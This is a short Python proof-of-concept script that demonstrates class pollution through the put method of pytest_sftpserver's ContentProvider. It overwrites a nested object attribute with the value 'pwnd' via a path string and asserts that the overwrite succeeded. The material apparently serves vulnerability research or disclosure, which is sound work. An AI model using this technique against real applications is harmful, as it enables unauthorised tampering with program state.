# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: put
# Type: get-both-set-both

from pytest_sftpserver.sftp.content_provider import ContentProvider

class Target:
    name = "clean"

class Root:
    target = Target()

root = Root()
cp = ContentProvider(content_object=root)

def run_poc():
    cp.put("/target/name", b"pwnd")

def verify_poc():
    assert root.target.name == "clean", "Pre-condition failed"
    run_poc()
    print(f"After: root.target.name = {root.target.name}")
    assert root.target.name == b"pwnd", "Class pollution failed!"
    print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
    verify_poc()
